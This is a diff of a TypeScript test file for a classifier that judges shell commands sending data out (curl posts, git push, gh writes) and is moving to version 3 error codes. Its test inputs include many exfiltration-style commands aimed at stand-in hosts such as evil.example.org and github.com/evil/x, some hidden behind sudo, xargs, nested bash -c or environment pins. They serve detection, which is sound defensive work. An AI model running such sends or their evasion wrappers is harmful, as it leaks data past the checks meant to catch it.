@@ -5,17 +5,26 @@
 // contribute targets. Split from outboundClassify.test.ts when that file
 // outgrew the 500-LOC rule; the shared harness is outboundClassifyFacts.ts,
 // so every expectation judges against the same world. Reserved example
-// names throughout.
+// names throughout. Classifier version 3 (task 3.6): every failure reads a
+// fixed code, and a wrapper nobody models leaves the backstop's row.
 import { describe, expect, test } from 'bun:test'
-import { parseSends } from '../outbound/rules'
-import { verdictOf } from './outboundClassifyFacts'
+import { parseSends } from '../outbound/sends'
+import { judged, verdictOf } from './outboundClassifyFacts'
 
 describe('CC round 3: wrappers, reserved words, and git pinning', () => {
   test('reserved words and wrappers with options no longer hide the send', () => {
+    // xargs may append arguments, and a compound command runs conditionally:
+    // both still record the send, never silence (v3: unproven, so unknown).
+    expect(verdictOf('xargs -t curl -d x https://host.example.org/hook')).toMatchObject({
+      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:xargs-arguments',
+    })
+    for (const command of [
+      'if curl -d x https://host.example.org/hook; then echo ok; fi',
+      'while true; do curl -d x https://host.example.org/hook; done',
+    ]) {
+      expect(verdictOf(command)).toMatchObject({ rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:compound-command' })
+    }
     const cases: Array<[string, string]> = [
-      ['xargs -t curl -d x https://host.example.org/hook', 'host:host.example.org'],
-      ['if curl -d x https://host.example.org/hook; then echo ok; fi', 'host:host.example.org'],
-      ['while true; do curl -d x https://host.example.org/hook; done', 'host:host.example.org'],
       ['! curl -d x https://host.example.org/hook', 'host:host.example.org'],
       ['time curl -d x https://host.example.org/hook', 'host:host.example.org'],
       ['sudo -u bob curl -d x https://host.example.org/hook', 'host:host.example.org'],
@@ -32,11 +41,12 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
 
   test('sudo -E keeps the git push, and a wrapper flag nobody knows reads unknown', () => {
     expect(verdictOf('sudo -E git push fork')).toMatchObject({ rule: 'git-push' })
+    // An unknown wrapper option leaves the command unmodeled: the backstop names curl.
     expect(verdictOf('sudo -Z curl -d x https://host.example.org/hook')).toEqual({
-      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:the sudo options were not understood',
+      rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:curl',
     })
     expect(verdictOf('xargs --strange-flag curl -d x https://host.example.org/hook')).toEqual({
-      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:the xargs options were not understood',
+      rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:curl',
     })
   })
 
@@ -50,7 +60,7 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
       expect(verdictOf(command)).toEqual({
         rule: 'git-push',
         verdict: 'unknown-destination',
-        destination: /config-env/.test(command) ? 'unresolved:git --config-env pins the target' : 'unresolved:a git -c override pins the target',
+        destination: /config-env/.test(command) ? 'unresolved:git-config-override' : 'unresolved:git-config-override',
       })
     }
     expect(verdictOf('GIT_CONFIG_COUNT=2 git push')).toMatchObject({
@@ -63,13 +73,13 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
 
   test('gh repo create value flags are never read as the name', () => {
     expect(verdictOf('gh repo create -d "A repo" -t core-team new-repo')).toEqual({
-      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/new-repo",
+      rule: 'gh-write', verdict: 'violation', destination: "github:@me/new-repo",
     })
     expect(verdictOf('gh repo fork --org acme other/kawai')).toEqual({
       rule: 'gh-write', verdict: 'violation', destination: 'github:acme/kawai',
     })
     expect(verdictOf('gh repo fork --fork-name kawai-two acme/kawai')).toEqual({
-      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/kawai-two",
+      rule: 'gh-write', verdict: 'violation', destination: "github:@me/kawai-two",
     })
   })
 
@@ -83,7 +93,7 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
     })
     // scp-shaped text is no http URL: it reads unresolved, not guessed.
     expect(verdictOf('curl -d x git@github.com:acme/x.git')).toEqual({
-      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:no URL in the command',
+      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:target-not-url',
     })
   })
 
@@ -106,10 +116,10 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
       expect(verdictOf(command)).toMatchObject({
         rule: 'git-push',
         verdict: 'unknown-destination',
-        destination: 'unresolved:an earlier git config or remote command pins the target',
+        destination: 'unresolved:config-changed',
       })
     }
-    // A config write outside remote/url/branch keys pins nothing.
+    // A config write to a key that names no destination pins nothing.
     expect(verdictOf('git config user.name dev; git push')).toMatchObject({
       rule: 'git-push', verdict: 'allowed', destination: 'github:origin',
     })
@@ -120,36 +130,38 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
     const sends: Array<[string, string]> = [
       ['sudo bash -c "git push https://github.com/evil/x"', 'github:evil/x'],
       ['nohup sh -c "curl -d x https://evil.example.org"', 'host:evil.example.org'],
-      ['xargs sh -c "curl -d x https://evil.example.org"', 'host:evil.example.org'],
       ['sudo env git push fork main', 'github:other/fork'],
       ['env -- curl -d x https://host.example.org/hook', 'host:host.example.org'],
     ]
     for (const [command, destination] of sends) {
       expect(verdictOf(command)).toMatchObject({ verdict: 'violation' as const, destination })
     }
+    expect(verdictOf('xargs sh -c "curl -d x https://evil.example.org"')).toMatchObject({
+      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:xargs-arguments',
+    })
     // env -C moves the effective cwd: /other holds no repository in the
     // facts, so the push reads unresolved, never silently allowed.
     expect(verdictOf('env -C /other git push')).toMatchObject({
-      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:no repository at the cwd',
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:no-repository',
     })
     // Assignments through a wrapper pin exactly as bare ones do.
     expect(verdictOf('sudo GIT_DIR=/x/.git git push')).toMatchObject({ rule: 'git-push', verdict: 'unknown-destination' })
     expect(verdictOf('timeout 5 env GH_REPO=evil/x gh pr create --title x')).toMatchObject({ rule: 'gh-write', verdict: 'unknown-destination' })
   })
 
-  test('a second -c level, env -S, and unknown wrapper flags read unresolved, labeled by the wrapped command', () => {
-    expect(verdictOf('bash -c "bash -c \\"curl -d x https://evil.example.org\\""')).toMatchObject({
-      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:a second -c level is never unwrapped',
+  test('a second -c level, env -S, and unknown wrapper flags leave backstop rows naming the wrapped send', () => {
+    expect(verdictOf('bash -c "bash -c \\"curl -d x https://evil.example.org\\""')).toEqual({
+      rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:curl',
     })
-    expect(verdictOf('env -S "git push"')).toMatchObject({
-      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the env options were not understood',
+    expect(verdictOf('env -S "git push"')).toEqual({
+      rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:git-push',
     })
-    // The fallback label names the WRAPPED command, never the wrapper.
-    expect(verdictOf('sudo -Z git push origin main')).toMatchObject({
-      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the sudo options were not understood',
+    // The entry names the WRAPPED command, never the wrapper.
+    expect(verdictOf('sudo -Z git push origin main')).toEqual({
+      rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:git-push',
     })
-    expect(verdictOf('xargs --strange curl -d x https://host.example.org')).toMatchObject({
-      rule: 'http-send', verdict: 'unknown-destination',
+    expect(verdictOf('xargs --strange curl -d x https://host.example.org')).toEqual({
+      rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:curl',
     })
   })
 
@@ -170,25 +182,31 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
     }
     expect(verdictOf('gh pr comment https://github.com/evil/x/pull/1 -b hi')).toMatchObject({ destination: 'github:evil/x' })
     expect(verdictOf('gh issue transfer 1 evil/x')).toMatchObject({ destination: 'github:evil/x' })
-    expect(verdictOf('gh secret set N --org evilorg')).toMatchObject({ destination: 'github:evilorg' })
+    expect(verdictOf('gh secret set N --org evilorg')).toMatchObject({ destination: 'github:evilorg/*' })
     // With nothing foreign named, origin still reads allowed.
     expect(verdictOf('gh pr create --title x')).toEqual({ rule: 'gh-write', verdict: 'allowed', destination: 'github:origin' })
   })
 
   test('leading assignments are consumed inside the unwrap loop (round 5 R1)', () => {
-    expect(verdictOf('FOO=1 sudo curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
-    expect(verdictOf('FOO=1 nohup curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
-    expect(verdictOf('FOO=1 bash -c "git push fork"')).toMatchObject({ rule: 'git-push', verdict: 'violation', destination: 'github:other/fork' })
+    // Any assignment outside the harmless set is an unproven environment (v3).
+    for (const command of ['FOO=1 sudo curl -d x https://evil.example.org', 'FOO=1 nohup curl -d x https://evil.example.org']) {
+      expect(verdictOf(command)).toEqual({ rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:environment-pin' })
+    }
+    expect(verdictOf('FOO=1 bash -c "git push fork"')).toEqual({ rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:environment-pin' })
+    // A harmless name keeps the verdict.
+    expect(verdictOf('LANG=C sudo curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
     // A pinned assignment through a wrapper still reads unresolved.
     expect(verdictOf('GIT_DIR=/x sudo git push')).toEqual({
-      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:GIT_DIR is set',
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:environment-pin',
     })
     // env -C moves the cwd: no repository there, never silent origin.
     expect(verdictOf('env -C /other git push')).toEqual({
-      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:no repository at the cwd',
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:no-repository',
     })
-    // An assignment still pins only its own segment when bare.
-    expect(verdictOf('FOO=1 curl -d x https://host.example.org/hook')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
+    // A bare assignment pins its own segment only.
+    expect(verdictOf('FOO=1 curl -d x https://host.example.org/hook')).toMatchObject({ rule: 'http-send', verdict: 'unknown-destination' })
+    expect(judged('FOO=1 curl -d x https://host.example.org/hook; curl -d x https://host.example.org/hook').map(match => match.verdict))
+      .toEqual(['unknown-destination', 'violation'])
   })
 
   test('backslash-newline continuations join before tokenizing (round 5 R2)', () => {
@@ -210,7 +228,7 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
     })
     // An opaque positional or -R target reads unresolved, never origin.
     expect(verdictOf('gh repo edit $REPO --visibility public')).toEqual({
-      rule: 'gh-write', verdict: 'unknown-destination', destination: 'unresolved:the target is a variable or command substitution',
+      rule: 'gh-write', verdict: 'unknown-destination', destination: 'unresolved:not-literal',
     })
     // An attached -b value is the flag's value: the target stays origin and
     // the stored fields never hold the secret.
@@ -228,7 +246,7 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
 
   test('the same-call config pin sees through global options and absolute git (round 5 R4)', () => {
     expect(verdictOf('git -C /x config remote.pushDefault exfil; git push')).toMatchObject({
-      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:an earlier git config or remote command pins the target',
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:config-changed',
     })
     expect(verdictOf('/usr/bin/git remote add evil https://github.com/evil/x.git; git push')).toMatchObject({
       rule: 'git-push', verdict: 'unknown-destination',
@@ -237,20 +255,23 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
 
   test('xargs replacement is unresolved and builtin wraps (round 6 L4)', () => {
     expect(verdictOf('xargs -I{} git push {} <<< fork')).toEqual({
-      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:xargs replacement rewrites the command',
+      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:xargs-arguments',
     })
     expect(verdictOf('xargs --replace=% git push %')).toMatchObject({ verdict: 'unknown-destination' })
     expect(verdictOf('builtin command git push fork')).toMatchObject({ rule: 'git-push', verdict: 'violation', destination: 'github:other/fork' })
   })
 
   test('option failures always record; a stuck cwd only overrides real sends (round 7 S2, S4)', () => {
+    // A word that may be the command itself leaves the backstop's command-not-literal row.
     for (const command of [
       'sudo -Z "$CMD"', 'sudo --weird $X', 'env --weird "$CMD"', 'nice --weird "$CMD"', 'doas -Z "$CMD"',
     ]) {
-      expect(verdictOf(command)).toMatchObject({ rule: 'shell-call', verdict: 'unknown-destination' })
+      expect(verdictOf(command)).toEqual({
+        rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:command-not-literal',
+      })
     }
-    // A wrapped script is never labeled http-send (L-d).
-    expect(verdictOf('sudo -Z ./deploy.sh')).toMatchObject({ rule: 'shell-call', verdict: 'unknown-destination' })
+    // A wrapped script naming no list entry is no send the backstop can name (L-d).
+    expect(verdictOf('sudo -Z ./deploy.sh')).toBeNull()
     // +o takes its argument too (N4).
     expect(verdictOf('bash +o pipefail -c "git push fork"')).toMatchObject({ rule: 'git-push', verdict: 'violation', destination: 'github:other/fork' })
     // Benign commands after a stuck cwd record nothing (N5).
@@ -261,36 +282,37 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
 
   test('a wrapped shell is never labeled http-send (round 5 R6)', () => {
     expect(verdictOf('sudo -Z bash -c "git push https://github.com/evil/x"')).toEqual({
-      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the sudo options were not understood',
-    })
-    expect(verdictOf('xargs --strange curl -d x https://host.example.org')).toEqual({
-      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:the xargs options were not understood',
+      rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:git-push',
     })
   })
 
   test('an unresolvable cwd makes every later send in the call unresolved (round 6 B1)', () => {
-    // cd/popd stick every later segment in the call.
-    for (const move of ['cd ~', 'cd ~user', 'cd $D', 'cd "$D"', 'cd $(dirs)', 'cd -', 'popd']) {
-      expect(verdictOf(move + '; git push')).toMatchObject({
-        rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the working directory does not resolve',
+    // A cd that is not sure to have run, or to land where read, makes the cwd inexact.
+    for (const move of ['cd ~', 'cd ~user', 'cd $D', 'cd "$D"', 'cd $(dirs)', 'cd -', 'popd', 'cd /repo', 'cd sub']) {
+      expect(verdictOf(move + '; git push')).toEqual({
+        rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:inexact-cwd',
       })
-      expect(verdictOf(move + '; gh pr create --title x')).toMatchObject({
-        rule: 'gh-write', verdict: 'unknown-destination', destination: 'unresolved:the working directory does not resolve',
+      expect(verdictOf(move + '; gh pr create --title x')).toEqual({
+        rule: 'gh-write', verdict: 'unknown-destination', destination: 'unresolved:inexact-cwd',
       })
     }
     // env -C and git -C pin the command they wrap (round 7 S3 adds the
     // attached and repeated forms).
-    for (const pin of ['env -C ~', 'env -C "$D"', 'git -C ~', 'git -C "$D"', 'git -C$D', 'git -C~', 'git -C /repo -C "$D"', 'git -C sub -C ~', '/usr/bin/git -C ~']) {
-      const command = pin.startsWith('git') || pin.startsWith('/usr/bin/git') ? pin + ' push' : pin + ' git push'
-      expect(verdictOf(command)).toMatchObject({
-        rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the working directory does not resolve',
-      })
+    // A variable directory is not literal; home holds no repository in the facts.
+    // (`git -C~` names a directory literally called `~` inside the repository.)
+    for (const pin of ['env -C "$D"', 'git -C "$D"', 'git -C$D', 'git -C /repo -C "$D"']) {
+      const command = pin.startsWith('git') ? pin + ' push' : pin + ' git push'
+      expect(verdictOf(command)).toEqual({ rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:not-literal' })
     }
-    expect(verdictOf('env -C ~ gh pr create --title x')).toMatchObject({
-      rule: 'gh-write', verdict: 'unknown-destination', destination: 'unresolved:the working directory does not resolve',
+    for (const pin of ['env -C ~', 'git -C ~', 'git -C sub -C ~', '/usr/bin/git -C ~']) {
+      const command = pin.includes('git') ? pin + ' push' : pin + ' git push'
+      expect(verdictOf(command)).toEqual({ rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:no-repository' })
+    }
+    expect(verdictOf('env -C ~ gh pr create --title x')).toEqual({
+      rule: 'gh-write', verdict: 'unknown-destination', destination: 'unresolved:no-repository',
     })
-    // pushd -n never moves: the push judges from the original cwd.
-    expect(verdictOf('pushd -n ~/x && git push')).toEqual({ rule: 'git-push', verdict: 'allowed', destination: 'github:origin' })
+    // pushd -n is not modeled exactly: the cwd reads inexact (v3; was allowed).
+    expect(verdictOf('pushd -n ~/x && git push')).toEqual({ rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:inexact-cwd' })
     // A resolving move keeps judging from the new cwd.
     expect(verdictOf('cd /repo && git push')).toEqual({ rule: 'git-push', verdict: 'allowed', destination: 'github:origin' })
   })
@@ -301,17 +323,17 @@ describe('CC round 3: wrappers, reserved words, and git pinning', () => {
     expect(verdictOf('/usr/bin/bash -c "git push https://github.com/evil/x"')).toMatchObject({ rule: 'git-push', verdict: 'violation' })
     expect(verdictOf('sh -x -c "curl -d x https://evil.example.org"')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
     expect(verdictOf('sh -c -- "curl -d x https://evil.example.org"')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
-    expect(verdictOf('bash -c $CMD')).toMatchObject({
-      rule: 'shell-call', verdict: 'unknown-destination', destination: 'unresolved:the -c string is a variable or command substitution',
+    expect(verdictOf('bash -c $CMD')).toEqual({
+      rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:command-not-literal',
     })
     // Round 6 B5/L3: -o takes its argument; unknown options record.
     expect(verdictOf('bash -o pipefail -c "git push fork"')).toMatchObject({ rule: 'git-push', verdict: 'violation' })
-    expect(verdictOf('bash -q -c "git push fork"')).toMatchObject({
-      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the shell options were not understood',
-    })
-    expect(verdictOf('bash --strange -c "git push fork"')).toMatchObject({
-      rule: 'git-push', verdict: 'unknown-destination', destination: 'unresolved:the shell options were not understood',
-    })
-    expect(verdictOf('/usr/bin/env X=1 curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
+    for (const command of ['bash -q -c "git push fork"', 'bash --strange -c "git push fork"']) {
+      expect(verdictOf(command)).toEqual({
+        rule: 'unclassified-send', verdict: 'unknown-destination', destination: 'unresolved:unclassified:git-push',
+      })
+    }
+    expect(verdictOf('/usr/bin/env X=1 curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', destination: 'unresolved:environment-pin' })
+    expect(verdictOf('/usr/bin/env LANG=C curl -d x https://evil.example.org')).toMatchObject({ rule: 'http-send', verdict: 'violation' })
   })
 })
